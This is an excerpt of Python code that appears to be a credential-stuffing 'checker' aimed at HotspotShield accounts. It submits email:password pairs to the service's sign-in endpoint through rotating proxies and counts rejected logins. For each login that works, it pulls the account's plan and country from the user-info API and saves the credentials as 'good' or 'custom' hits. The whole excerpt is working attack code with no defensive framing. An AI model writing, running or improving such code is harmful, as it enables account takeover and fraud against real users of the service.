    ...
    while not Checker.stopping:
        try:
            with Session() as s:
                ...
                r = s.post(
                    "https://account.hotspotshield.com/sign-in",
                    headers=headers,
                    data=data,
                )
                if (
                    "Password is required!" in r.text
                    or "Wrong login info. Try again." in r.text
                    or '{"result":0,' in r.text
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                ...
                r = s.get(
                    "https://hotspotshield.aura.com/api/user/info", headers=headers
                )
                plan = r.json()["data"]["membership"]["plan"]
                country = r.json()["data"]["country"]
                if plan.lower() == "basic":
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "HotspotShield")
                    save(
                        "HotspotShield",
                        "custom",
                        Checker.time,
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "HotspotShield")
                save(
                    "HotspotShield",
                    "good",
                    Checker.time,
                    ":".join([email, password])
                    + f" | Plan: {plan} | Country: {country}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
